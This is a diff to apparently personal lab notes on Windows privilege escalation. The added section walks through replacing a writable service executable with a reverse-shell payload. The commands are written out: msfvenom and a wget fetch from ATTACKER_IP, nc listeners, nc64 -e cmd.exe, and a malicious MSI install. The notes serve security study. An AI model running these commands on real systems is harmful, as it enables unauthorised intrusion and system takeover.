@@ -115,9 +115,6 @@ echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 
 ## AlwaysInstallElevated
 
-
-## AlwaysInstallElevated
-
 Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
 
 This method requires two registry values to be set. You can query these from the command line using the commands below.
@@ -140,8 +137,71 @@ C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
 
 
----
+## Windows Services
 
+### Insecure Permissions on Service Executable
+
+```shell-session
+sc qc WindowsScheduler
+
+SERVICE_NAME: windowsscheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcuser1
+```
+Important objects are:
+	`BINARY_PATH_NAME`
+	`SERVICE_START_NAME`
+
+1. Query the permissions of the service executable
+```shell-session
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+```
+The Everyone group has modify permissions (M) on the service's executable
+
+2. generate an exe-service payload using msfvenom and serve it through a python webserver
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+
+`python3 -m http.server
+
+3. Then pull the payload from Powershell with the following command
+`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+
+4. nce the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
+
+```shell-session
+C:\> cd C:\PROGRA~2\SYSTEM~1\
+
+C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
+        Successfully processed 1 files.
+```
+
+5. We start a reverse listener on our attacker machine:
+```shell-session
+nc -lvp 4445
+```
+
+
+### Unquoted Service Paths
+
+
+
+
+---
 # Notes
 
 | **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
